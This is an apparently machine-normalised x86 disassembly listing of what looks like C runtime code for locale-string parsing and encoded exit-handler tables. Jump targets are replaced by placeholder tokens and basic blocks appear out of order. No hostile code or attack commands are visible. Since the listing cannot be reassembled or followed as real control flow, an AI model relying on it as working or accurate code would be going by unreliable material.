xor eax eax
push eax
push eax
push eax
push eax
push eax
jmp r-xdata
cmp [ esi ] 0x43
jne r-xdata
call sub_430e5d
int3
mov edi esi
xor edx edx
lea ecx [ edi + 0x2 ]
xor edi edi
cmp [ esi + 0x2 ] di
jne r-xdata
mov ax [ edi ]
add edi 0x2
cmp ax dx
jne r-xdata
sub edi ecx
sar edi 0x1
cmp edi 0x83
jae r-xdata
mov esi [ ebp - 0x1e8 ]
push r--data
push [ ebp + 0x10 ]
push esi
call sub_436420
add esp 0xc
test eax eax
jne r-xdata
call sub_4301d0
xor ebx ebx
test al al
lea eax [ ebp - 0x1d0 ]
push esi
push eax
sete bl
call sub_42b9be
pop ecx
pop ecx
test eax eax
jne r-xdata
mov eax [ ebp - 0x1d4 ]
mov ecx esi
push edi
push edi
push edi
push edi
push edi
test ebx ebx
je r-xdata
mov ebx [ ebp - 0x1d8 ]
lea eax [ ebp - 0x1d0 ]
test ebx ebx
mov ebx [ ebp - 0x1d8 ]
push eax
push ebx
push eax
je r-xdata
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
mov eax esi
jmp r-xdata
mov [ ebx ] edi
mov ebx [ ebp - 0x1dc ]
xor esi esi
mov ecx ebx
lea edx [ ecx + 0x2 ]
push 0x2
lea eax [ ebp - 0x1e4 ]
push eax
push 0x20001004
push esi
call sub_42fb9a
test eax eax
je r-xdata
call sub_43b095
call sub_43b9eb
jmp r-xdata
test ebx ebx
je r-xdata
mov eax [ ebp - 0x1e0 ]
mov ecx esi
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov ax [ ecx ]
add ecx 0x2
cmp ax si
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
push ebx
push 0x55
push [ ebp - 0x1f0 ]
call sub_436551
add esp 0x10
test eax eax
je r-xdata
call [ GetACP@IAT ]
mov [ ebp - 0x1e4 ] eax
mov eax [ ebp - 0x1e4 ]
test eax eax
jne r-xdata
push esi
call sub_42fdea
test eax eax
je r-xdata
lea eax [ ebp - 0x1d0 ]
push eax
push 0x83
push [ ebp - 0x1d4 ]
call sub_42b94e
mov ebx [ ebp - 0x1dc ]
add esp 0xc
test ebx ebx
je r-xdata
add esp 0xc
test eax eax
je r-xdata
mov ebx [ ebp - 0x1d4 ]
mov esi [ ebp - 0x1e8 ]
push ebx
push [ ebp + 0x10 ]
push esi
call sub_436420
add esp 0xc
test eax eax
jne r-xdata
mov eax [ ebp - 0x1d8 ]
mov eax [ eax ]
mov [ ebx ] eax
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
push esi
push esi
push esi
push esi
push esi
jmp r-xdata
push ebx
push esi
push [ ebp + 0x18 ]
push [ ebp - 0x1dc ]
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
movzx eax ax
mov [ ebx ] eax
lea ebx [ edi + 0x1 ]
push ebx
push esi
push 0x83
push [ ebp - 0x1d4 ]
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
xor ebx ebx
cmp [ esi ] bx
je r-xdata
lea ecx [ ebp - 0xb0 ]
lea edx [ ecx + 0x2 ]
mov eax ebx
jmp r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
push ebx
push esi
push 0x55
push [ ebp - 0x1f0 ]
mov eax [ ebp - 0x1e0 ]
xor ecx ecx
mov [ eax ] cx
mov ecx 0x83
cmp edi ecx
jae r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x1f4 ]
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
push eax
lea eax [ ebp - 0xb0 ]
push eax
push [ ebp + 0x18 ]
push ebx
jmp r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
lea eax [ edi + 0x1 ]
push eax
push esi
push ecx
push [ ebp - 0x1e0 ]
call sub_436551
add esp 0x10
test eax eax
je r-xdata
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
mov ebx [ ebp - 0x1ec ]
push ebx
push ebx
push ebx
push ebx
push ebx
jmp r-xdata
sub_42bf59
push 0x8
push r--data
call sub_40d270
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_40d2b6
retn
push 0x5
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42bffc
cmp [ esi ] 0x0
je r-xdata
or eax 0xffffffff
[ ecx ] eax
jne r-xdata
push esi
call sub_42d3b1
pop ecx
push 0x4
call sub_42f07b
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_43a809
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42c008
cmp [ eax + 0xc ] 0x0
jne r-xdata
push [ esi + 0x4 ]
call sub_42d3b1
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_43a63d
pop ecx
sub_42c011
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
call sub_430a7e
push 0x8
push 0x1
mov esi eax
call sub_42d49d
mov [ ebp - 0x4 ] eax
pop ecx
pop ecx
test eax eax
jne r-xdata
call sub_43a88a
call sub_437a95
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x4c ]
mov [ eax ] ecx
mov eax [ ebp - 0x4 ]
mov ecx [ esi + 0x48 ]
mov [ eax + 0x4 ] ecx
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x4
call sub_42b46b
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x8 ]
push eax
push 0x5
call sub_42b493
mov esi [ ebp - 0x4 ]
add esp 0x10
and [ ebp - 0x4 ] 0x0
xor esi esi
jmp r-xdata
push 0x0
call sub_42d3b1
pop ecx
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
sub_42c08c
mov edi edi
push ebp
mov ebp esp
push ecx
cmp [ ebp + 0x8 ] 0x5
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
push ebx
push edi
xor ebx ebx
push 0x8
inc ebx
push ebx
call sub_42d49d
mov edi eax
mov [ ebp - 0x4 ] edi
pop ecx
pop ecx
test edi edi
jne r-xdata
push esi
push 0xb8
push ebx
call sub_42d49d
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
call sub_430f56
xor ebx ebx
mov [ eax ] 0xc
jmp r-xdata
push 0x220
push ebx
call sub_42d49d
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
call sub_430f56
xor ebx ebx
mov [ eax ] 0xc
jmp r-xdata
push edi
call sub_42d3b1
pop ecx
pop edi
mov eax ebx
pop ebx
jmp r-xdata
push rw-data
push esi
call sub_42bb4f
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
call sub_42c3ef
add esp 0x14
test eax eax
je r-xdata
call sub_430f56
mov [ eax ] 0xc
jmp r-xdata
push esi
call sub_42d3b1
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push esi
call sub_43a809
push esi
xor esi esi
call sub_43a63d
pop ecx
pop ecx
push edi
push [ esi + 0x8 ]
call sub_437b8c
pop ecx
pop ecx
test eax eax
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov ecx esi
mov [ edi ] ebx
xor esi esi
mov ebx eax
mov [ eax ] ecx
mov ecx edi
xor edi edi
mov [ eax + 0x4 ] ecx
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
push edi
call sub_42d3b1
mov edi [ ebp - 0x4 ]
pop ecx
sub_42c195
mov edi edi
push ebp
mov ebp esp
push ebx
xor ebx ebx
push esi
mov esi ebx
cmp [ ebp + 0x10 ] ebx
jle r-xdata
pop esi
pop ebx
pop ebp
retn
push edi
lea edi [ ebp + 0x10 ]
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_430e5d
int3
inc esi
cmp esi [ ebp + 0x10 ]
jl r-xdata
lea edi [ edi + 0x4 ]
push [ edi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_43634b
add esp 0xc
test eax eax
jne r-xdata
pop edi
sub_42c1d6
mov edi edi
push ebp
mov ebp esp
sub esp 0x28
and [ ebp - 0xc ] 0x0
and [ ebp - 0x10 ] 0x0
cmp [ ebp + 0x8 ] 0x5
jbe r-xdata
call sub_430a7e
mov [ ebp - 0x8 ] eax
call sub_43a88a
mov eax [ ebp - 0x8 ]
lea ecx [ ebp - 0x1 ]
or [ eax + 0x350 ] 0x10
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x14 ] eax
lea eax [ ebp - 0x10 ]
mov [ ebp - 0x28 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
lea eax [ ebp + 0x8 ]
mov [ ebp - 0x1c ] eax
lea eax [ ebp + 0xc ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x28 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
call sub_42b35b
mov eax [ ebp - 0xc ]
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
xor eax eax
jmp r-xdata
mov esp ebp
pop ebp
retn
sub_42c256
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
xor esi esi
inc esi
push 0x6a6
mov [ ebp - 0x8 ] esi
call sub_42d3eb
mov ebx eax
xor eax eax
pop ecx
test ebx ebx
je r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
lea edi [ ebx + 0x4 ]
mov [ edi ] ax
mov [ ebx ] esi
mov esi [ ebp + 0x8 ]
lea eax [ esi + 0x30 ]
push [ eax ]
mov [ ebp - 0xc ] eax
push r--data
push [ r--data ]
push 0x3
push 0x351
push edi
call sub_42c195
mov eax r--data
add esp 0x18
mov [ ebp - 0x4 ] eax
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
mov eax [ ebp - 0xc ]
lea ecx [ eax + 0x10 ]
mov eax [ eax ]
mov [ ebp - 0xc ] ecx
mov ecx [ ecx ]
sbb eax eax
or eax 0x1
test dx dx
je r-xdata
push r--data
push 0x351
push edi
call sub_43634b
add esp 0xc
test eax eax
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
jne r-xdata
push ebx
call sub_42d3b1
pop ecx
mov ecx [ esi + 0x28 ]
or edi 0xffffffff
test ecx ecx
je r-xdata
mov ecx [ esi + 0x28 ]
or edi 0xffffffff
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
neg eax
sbb eax eax
add ecx 0xc
not eax
mov [ ebp - 0x4 ] ecx
and [ ebp - 0x8 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0xc ] eax
push [ eax ]
push r--data
push [ ecx ]
push 0x3
push 0x351
push edi
call sub_42c195
mov eax [ ebp - 0x4 ]
add esp 0x18
cmp eax r--data
jl r-xdata
add eax 0x4
add ecx 0x4
test dx dx
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax edi
[ ecx ] eax
jne r-xdata
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax edi
[ ecx ] eax
jne r-xdata
mov dx [ eax ]
cmp dx [ ecx ]
jne r-xdata
xor eax eax
mov [ esi + 0x24 ] eax
mov [ esi + 0x1c ] eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x20 ] eax
mov eax [ esi + 0x40 ]
jmp r-xdata
[ eax ] edi
dec edi
jne r-xdata
push [ esi + 0x28 ]
call sub_42d3b1
pop ecx
and [ esi + 0x24 ] 0x0
lea eax [ ebx + 0x4 ]
and [ esi + 0x1c ] 0x0
mov [ esi + 0x28 ] ebx
mov [ esi + 0x20 ] eax
[ eax ] edi
dec edi
jne r-xdata
push [ esi + 0x28 ]
call sub_42d3b1
pop ecx
pop edi
push [ esi + 0x24 ]
call sub_42d3b1
pop ecx
push [ esi + 0x24 ]
call sub_42d3b1
pop ecx
sub_42c3ef
mov edi edi
push ebp
mov ebp esp
sub esp 0x1d0
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x1c8 ] edi
test eax eax
je r-xdata
xor eax eax
mov [ ebp - 0x1c0 ] 0x1
mov [ ebp - 0x1cc ] eax
mov ebx eax
mov [ ebp - 0x1bc ] ebx
test esi esi
je r-xdata
test esi esi
je r-xdata
push edi
call sub_42c256
pop ecx
cmp [ esi ] 0x4c
jne r-xdata
add eax 0x2
add eax eax
mov eax [ edi + eax * 8 ]
jmp r-xdata
push esi
push eax
push edi
call sub_42c6d4
add esp 0xc
jmp r-xdata
push eax
push 0x55
lea eax [ ebp - 0x1b8 ]
push eax
push 0x83
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_42bbe2
add esp 0x18
test eax eax
je r-xdata
cmp [ esi + 0x2 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
xor ecx ecx
lea edx [ edi + 0x20 ]
mov esi ecx
mov [ ebp - 0x1bc ] edx
cmp [ esi + 0x4 ] 0x5f
jne r-xdata
mov eax [ ebp - 0x1c0 ]
mov ecx [ edx ]
lea eax [ ebp - 0x10c ]
push r--data
push esi
call sub_43a3e9
mov ebx eax
mov [ ebp - 0x1d0 ] ebx
pop ecx
pop ecx
test ebx ebx
je r-xdata
test esi esi
je r-xdata
test eax eax
jne r-xdata
sbb eax eax
or eax 0x1
xor ecx ecx
cmp [ eax ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
sub eax esi
sar eax 0x1
mov [ ebp - 0x1c0 ] eax
je r-xdata
test ebx ebx
inc ebx
lea eax [ ebp - 0x10c ]
push eax
push esi
push edi
call sub_42c6d4
mov edx [ ebp - 0x1bc ]
add esp 0xc
test eax eax
je r-xdata
xor ecx ecx
mov eax ecx
jmp r-xdata
mov dx [ eax + 0x2 ]
cmp dx [ ecx + 0x2 ]
mov [ ebp - 0x1c2 ] dx
mov edx [ ebp - 0x1bc ]
jne r-xdata
push 0x3b
pop eax
cmp [ ebx ] ax
je r-xdata
mov eax ecx
jmp r-xdata
xor ecx ecx
mov eax ecx
mov [ ebp - 0x1c0 ] eax
jmp r-xdata
inc ebx
xor ecx ecx
jmp r-xdata
test eax eax
je r-xdata
add eax 0x4
add ecx 0x4
cmp [ ebp - 0x1c2 ] 0x0
jne r-xdata
mov edi [ ebp - 0x1c0 ]
mov ebx r--data
mov [ ebp - 0x1c4 ] 0x1
inc esi
add edx 0x10
mov [ ebp - 0x1bc ] edx
cmp esi 0x5
jle r-xdata
mov di [ eax ]
cmp di [ ecx ]
mov edi [ ebp - 0x1c8 ]
jne r-xdata
inc [ ebp - 0x1c4 ]
add ebx 0xc
cmp ebx r--data
jle r-xdata
mov ecx [ ebx ]
lea edx [ ecx + 0x2 ]
push edi
push esi
push [ ebx ]
call sub_43a3af
add esp 0xc
test eax eax
jne r-xdata
mov ebx [ ebp - 0x1d0 ]
add ebx 0x2
push r--data
push ebx
call sub_43a35f
mov edi [ ebp - 0x1c8 ]
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x1cc ]
jne r-xdata
sub ecx edx
sar ecx 0x1
cmp edi ecx
je r-xdata
cmp [ ebp - 0x1c4 ] 0x5
jg r-xdata
push 0x3b
pop eax
cmp [ ebx ] ax
jne r-xdata
mov eax [ ebp - 0x1bc ]
push esi
push ebx
lea eax [ ebp - 0x10c ]
push 0x83
push eax
call sub_436551
add esp 0x10
test eax eax
jne r-xdata
test eax eax
jmp r-xdata
add esi 0x2
cmp [ esi ] cx
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
lea eax [ esi + esi ]
cmp eax 0x106
jae r-xdata
jne r-xdata
call sub_40c93f
xor ecx ecx
mov [ ebp + eax - 0x10c ] cx
lea eax [ ebp - 0x10c ]
push eax
push [ ebp - 0x1c4 ]
push edi
call sub_42c6d4
add esp 0xc
test eax eax
mov eax [ ebp - 0x1bc ]
je r-xdata
lea esi [ ebx + esi * 2 ]
xor ecx ecx
cmp [ esi ] cx
je r-xdata
inc eax
mov [ ebp - 0x1bc ] eax
jmp r-xdata
sub_42c6d4
mov edi edi
push ebp
mov ebp esp
sub esp 0x2e4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x8 ]
mov [ ebp - 0x2e4 ] ebx
call sub_430a7e
add eax 0x278
mov [ ebp - 0x2d4 ] eax
lea eax [ ebp - 0x2c0 ]
push eax
push 0x55
lea eax [ ebp - 0x2b8 ]
push eax
push 0x83
lea eax [ ebp - 0x10c ]
push eax
push esi
call sub_42bbe2
add esp 0x18
test eax eax
jne r-xdata
lea esi [ ebx + 0x2 ]
shl esi 0x4
lea eax [ ebp - 0x10c ]
mov [ ebp - 0x2c8 ] esi
mov edx [ esi + edi ]
mov ecx edx
xor eax eax
sbb eax eax
or eax 0x1
cmp [ eax ] 0x0
je r-xdata
lea ecx [ ebp - 0x10c ]
lea edx [ ecx + 0x2 ]
mov eax edx
jmp r-xdata
mov eax [ ebp - 0x2bc ]
jmp r-xdata
mov si [ eax + 0x2 ]
cmp si [ ecx + 0x2 ]
mov [ ebp - 0x2c2 ] si
mov esi [ ebp - 0x2c8 ]
jne r-xdata
mov ax [ ecx ]
add ecx 0x2
cmp ax [ ebp - 0x2bc ]
jne r-xdata
sub ecx edx
sar ecx 0x1
lea eax [ ecx + 0x1 ]
mov [ ebp - 0x2cc ] eax
lea eax [ eax * 2 + 0x4 ]
push eax
call sub_42d3eb
mov [ ebp - 0x2d8 ] eax
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
test eax eax
jne r-xdata
add eax 0x4
add ecx 0x4
cmp [ ebp - 0x2c2 ] 0x0
jne r-xdata
mov ecx [ esi + edi ]
add eax 0x4
mov [ ebp - 0x2d0 ] ecx
mov ecx [ edi + ebx * 4 + 0xa0 ]
mov [ ebp - 0x2dc ] ecx
mov ecx [ edi + 0x8 ]
mov [ ebp - 0x2e0 ] ecx
lea ecx [ ebp - 0x10c ]
push ecx
push [ ebp - 0x2cc ]
mov [ ebp - 0x2c4 ] eax
push eax
call sub_436420
add esp 0xc
test eax eax
jne r-xdata
mov si [ eax ]
and [ ebp - 0x2bc ] 0x0
cmp si [ ecx ]
mov esi [ ebp - 0x2c8 ]
jne r-xdata
mov eax [ ebp - 0x2bc ]
push eax
push eax
push eax
push eax
push eax
call sub_430e5d
int3
cmp [ ebp - 0x10c ] 0x43
mov eax [ ebp - 0x2c4 ]
mov [ esi + edi ] eax
jne r-xdata
lea eax [ ebp - 0x2b8 ]
push eax
call sub_42b88b
pop ecx
mov ecx [ ebp - 0x2bc ]
mov [ edi + ebx * 4 + 0xa0 ] eax
cmp [ ebp - 0x10a ] 0x0
jne r-xdata
cmp ebx 0x1
jne r-xdata
mov esi [ ebp - 0x2d4 ]
mov edx ecx
mov eax [ ebp - 0x2c0 ]
mov ecx esi
mov [ edi + 0x8 ] eax
mov [ ebp - 0x2c4 ] esi
mov eax [ esi + 0x20 ]
mov [ ebp - 0x2cc ] eax
mov eax [ esi + 0x24 ]
mov [ ebp - 0x2c0 ] eax
mov ecx [ ebp - 0x2bc ]
mov [ edi + ebx * 4 + 0xa0 ] ecx
jmp r-xdata
cmp ebx 0x5
jne r-xdata
mov eax [ ebp - 0x2c0 ]
mov [ edi + 0x10 ] eax
jmp r-xdata
test edx edx
je r-xdata
mov esi [ ebp - 0x2c4 ]
inc edx
mov eax [ ecx ]
mov ebx [ ebp - 0x2cc ]
mov ecx [ ecx + 0x4 ]
mov [ esi ] ebx
mov ebx [ ebp - 0x2c0 ]
mov [ ebp - 0x2c0 ] ecx
mov ecx esi
add ecx 0x8
mov [ esi + 0x4 ] ebx
mov ebx [ ebp - 0x2e4 ]
mov esi [ ebp - 0x2d4 ]
mov [ ebp - 0x2cc ] eax
mov [ ebp - 0x2c4 ] ecx
cmp edx 0x5
jl r-xdata
cmp ebx 0x2
jne r-xdata
imul eax ebx 0xc
push edi
mov esi [ eax + r--data ]
mov ecx esi
call [ r--data ]
call esi
pop ecx
mov ecx [ ebp - 0x2d0 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x2c0 ]
mov [ edi + 0x14 ] eax
cmp edx 0x5
jne r-xdata
mov eax [ esi + edx * 8 ]
mov [ esi ] eax
mov eax [ esi + edx * 8 + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x2cc ]
mov [ esi + edx * 8 ] eax
mov eax [ ebp - 0x2c0 ]
mov [ esi + edx * 8 + 0x4 ] eax
mov eax [ edi + 0x8 ]
cmp eax [ ecx ]
je r-xdata
jmp r-xdata
cmp ecx rw-data
je r-xdata
mov eax [ ebp - 0x2c8 ]
mov [ eax + edi ] ecx
push [ edi + ebx * 4 + 0xa0 ]
call sub_42d3b1
mov ecx [ ebp - 0x2d8 ]
mov eax [ ebp - 0x2dc ]
push ecx
mov [ edi + ebx * 4 + 0xa0 ] eax
call sub_42d3b1
mov eax [ ebp - 0x2e0 ]
pop ecx
pop ecx
mov [ edi + 0x8 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi + 0x18 ] eax
jmp r-xdata
push 0x1
push [ edi + 0x8 ]
lea eax [ ebp - 0x20c ]
push eax
push 0x7f
push r--data
push 0x1
push [ ebp - 0x2bc ]
call sub_43a483
add esp 0x1c
test eax eax
mov eax [ ebp - 0x2bc ]
je r-xdata
mov eax [ ebp - 0x2c8 ]
mov esi ebx
or ecx 0xffffffff
add esi esi
mov eax [ edi + esi * 8 + 0x28 ]
[ eax ] ecx
jne r-xdata
mov [ esi + 0x4 ] eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x20c ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push [ edi + esi * 8 + 0x28 ]
call sub_42d3b1
push [ edi + esi * 8 + 0x24 ]
call sub_42d3b1
push [ edi + ebx * 4 + 0xa0 ]
call sub_42d3b1
mov eax [ ebp - 0x2c8 ]
add esp 0xc
mov ecx [ ebp - 0x2bc ]
mov [ eax + edi ] ecx
mov [ edi + ebx * 4 + 0xa0 ] ecx
jmp r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x20c ]
push eax
call sub_448fe2
xor ecx ecx
add esp 0xc
test eax eax
sete cl
mov [ esi + 0x4 ] ecx
jmp r-xdata
mov ecx [ ebp - 0x2d8 ]
add ebx ebx
mov [ ecx ] 0x1
mov eax [ eax + edi ]
mov [ edi + ebx * 8 + 0x28 ] ecx
jmp r-xdata
mov eax [ edi + 0x8 ]
mov [ esi ] eax
sub_42cacb
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ecx rw-data
xchg [ ecx ] eax
pop ebp
retn
cmp eax 0x1
je r-xdata
call sub_430f56
mov [ eax ] 0x16
call sub_430e30
or eax 0xffffffff
pop ebp
retn
sub_42cb2f
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_42cdf9
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42cb74
mov eax esi
call sub_40d2b6
retn 0xc
sub_42cb80
push 0xc
push r--data
call sub_40d270
and [ ebp - 0x1c ] 0x0
mov eax [ ebp + 0x8 ]
push [ eax ]
call sub_42f07b
pop ecx
and [ ebp - 0x4 ] 0x0
mov ecx [ ebp + 0xc ]
call sub_42ccd0
mov esi eax
mov [ ebp - 0x1c ] esi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42cbc5
mov eax esi
call sub_40d2b6
retn 0xc
sub_42cbd1
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42cb80
mov esp ebp
pop ebp
retn
sub_42cbf9
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x1 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
call sub_42cb2f
mov esp ebp
pop ebp
retn
sub_42cc21
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
mov eax [ ebp + 0x8 ]
ror eax cl
xor eax [ rw-data ]
pop ebp
retn
sub_42ccd0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax ecx
mov [ ebp - 0x18 ] eax
push ebx
mov eax [ eax ]
mov ebx [ eax ]
test ebx ebx
jne r-xdata
mov edx [ rw-data ]
push esi
push edi
mov edi [ ebx ]
mov esi edx
mov ebx [ ebx + 0x4 ]
and esi 0x1f
xor edi edx
mov [ ebp - 0x14 ] esi
mov ecx esi
xor ebx edx
ror edi cl
ror ebx cl
test edi edi
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop edi
xor eax eax
pop esi
cmp edi 0xffffffff
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
pop ebx
call sub_40c38e
mov esp ebp
pop ebp
retn
mov [ ebp - 0xc ] edi
mov [ ebp - 0x10 ] ebx
cmp edi 0xffffffff
je r-xdata
cmp [ ebx ] eax
je r-xdata
mov eax edx
xor edx edx
and eax 0x1f
push 0x20
pop ecx
sub ecx eax
ror edx cl
mov ecx [ ebp - 0x18 ]
xor edx [ rw-data ]
mov eax [ ecx ]
mov eax [ eax ]
mov [ eax ] edx
mov eax [ ecx ]
mov eax [ eax ]
mov [ eax + 0x4 ] edx
mov eax [ ecx ]
mov eax [ eax ]
mov [ eax + 0x8 ] edx
push edi
call sub_42d3b1
mov edx [ rw-data ]
pop ecx
sub ebx 0x4
cmp ebx edi
jb r-xdata
mov esi [ ebx ]
mov ecx [ ebp - 0x14 ]
xor esi edx
ror esi cl
mov ecx esi
mov [ ebx ] eax
call [ r--data ]
call esi
mov eax [ ebp - 0x18 ]
mov edx [ rw-data ]
mov esi edx
and esi 0x1f
mov [ ebp - 0x14 ] esi
mov eax [ eax ]
mov eax [ eax ]
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
xor ecx edx
mov [ ebp - 0x8 ] ecx
xor eax edx
mov ecx esi
ror [ ebp - 0x8 ] cl
ror eax cl
mov ecx [ ebp - 0x8 ]
cmp ecx [ ebp - 0xc ]
jne r-xdata
mov [ ebp - 0xc ] ecx
mov edi ecx
mov [ ebp - 0x10 ] eax
mov ebx eax
jmp r-xdata
push 0x20
pop ecx
cmp eax [ ebp - 0x10 ]
je r-xdata
push 0x20
pop ecx
sub ecx esi
xor eax eax
ror eax cl
xor eax edx
mov ecx [ ebp - 0x8 ]
sub_42cdf9
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
mov eax ecx
mov [ ebp - 0x8 ] eax
push esi
mov eax [ eax ]
mov esi [ eax ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov ecx eax
push ebx
mov ebx [ esi ]
and ecx 0x1f
push edi
mov edi [ esi + 0x4 ]
xor ebx eax
mov esi [ esi + 0x8 ]
xor edi eax
xor esi eax
ror edi cl
ror esi cl
ror ebx cl
cmp edi esi
jne r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
push [ eax ]
call sub_42cc21
push ebx
mov [ edi ] eax
call sub_40cb45
mov ebx [ ebp - 0x8 ]
mov ecx [ ebx ]
mov ecx [ ecx ]
mov [ ecx ] eax
lea eax [ edi + 0x4 ]
push eax
call sub_40cb45
mov ecx [ ebx ]
push esi
mov ecx [ ecx ]
mov [ ecx + 0x4 ] eax
call sub_40cb45
mov ecx [ ebx ]
add esp 0x10
mov ecx [ ecx ]
mov [ ecx + 0x8 ] eax
xor eax eax
sub esi ebx
mov eax 0x200
sar esi 0x2
cmp esi eax
ja r-xdata
pop esi
mov esp ebp
pop ebp
retn
lea edi [ eax + esi ]
